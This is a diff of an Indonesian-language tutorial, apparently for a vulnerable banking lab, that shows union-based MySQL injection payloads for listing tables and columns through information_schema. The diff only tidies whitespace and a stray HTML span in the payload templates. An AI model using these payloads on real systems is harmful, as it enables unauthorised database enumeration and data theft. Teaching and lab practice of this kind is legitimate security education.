@@ -30,18 +30,18 @@ union select table_schema,1,2 from information_schema.tables;
 
    ###### Format :
    ```
-   union select table_name,1,2 from information_schema.tables WHERE table_type = 'base table' AND    table_schema='nama database';
+   union select table_name,1,2 from information_schema.tables WHERE table_type = 'base table' AND table_schema='nama database';
    ```
    ###### Contoh :
    ```
-   union select table_name,1,2 from information_schema.tables WHERE table_type = 'base table' AND    table_schema='vuln_server_perbankan_felix672018159';
+   union select table_name,1,2 from information_schema.tables WHERE table_type = 'base table' AND table_schema='vuln_server_perbankan_felix672018159';
    ```
 
 ##### 3. Mysql Injection untuk mencari kolom pada tabel pada database yang dipilih:
 
    ###### Format :
    ```
-   union select column_name,1,2  FROM information_schema.columns WHERE `TABLE_SCHEMA`='<span style="color:red;">nama database</span>' AND `TABLE_NAME`='nama tabel';
+   union select column_name,1,2  FROM information_schema.columns WHERE `TABLE_SCHEMA`='nama database' AND `TABLE_NAME`='nama tabel';
    ```
    ###### Contoh :
    ```
